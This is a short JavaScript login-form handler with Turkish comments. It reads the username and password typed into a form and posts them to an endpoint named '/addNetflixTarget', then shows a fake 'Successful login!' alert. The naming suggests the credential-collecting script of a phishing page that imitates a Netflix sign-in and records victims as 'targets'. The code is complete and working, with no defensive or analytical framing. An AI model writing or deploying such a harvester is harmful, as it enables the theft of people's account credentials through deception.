
document.getElementById('loginForm').addEventListener('submit', async function(event) {
  event.preventDefault(); // Formun geleneksel şekilde gönderilmesini önle

  const username = document.getElementsByName('username')[0].value;
  const password = document.getElementsByName('password')[0].value;

  // Fetch API kullanarak sunucuya veri gönder
  try {
    const response = await fetch('/addNetflixTarget', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });

    const data = await response.json();

    if (response.ok) {
      console.log('Login Successful', data.message);
      alert('Successful login!');
      location.reload();
    } else {
      // Hata mesajını göster
      console.error('Hata:', data.message);
    }
  } catch (error) {
    console.error('Hata:', error.message);
  }
});
